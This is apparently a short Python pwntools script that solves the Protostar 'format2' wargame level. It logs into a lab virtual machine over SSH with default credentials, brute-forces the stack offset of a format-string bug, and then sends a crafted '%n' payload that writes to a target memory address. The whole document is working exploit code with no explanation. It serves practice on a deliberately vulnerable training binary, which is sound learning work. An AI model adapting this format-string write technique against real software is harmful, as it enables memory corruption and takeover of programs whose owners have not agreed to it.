

from pwn import *


r = ssh(host="192.168.160.128", user="user", password="user")

target_addr ="\xe4\x96\x04\x08"

position_stck=0
#padding='A'*56
padding = "%56x"
for i in range(100):
    payload = 'AAAABBCC%{}$p'.format(i)
    format2=r.run(["/opt/protostar/bin/format2"])
    format2.sendline(payload)
    output = format2.recvline().decode()
    if "41414141" in output:
        print("control stack address :" ,i , output )
        position_stck=i
        format2.close()

        payload2 = '{}BBAA{}%{}$8n'.format(target_addr, padding , position_stck)
        print(payload2)
        format2=r.run(["/opt/protostar/bin/format2"])
        format2.sendline(payload2)
        print(str(format2.recv()))
        format2.close()
        break









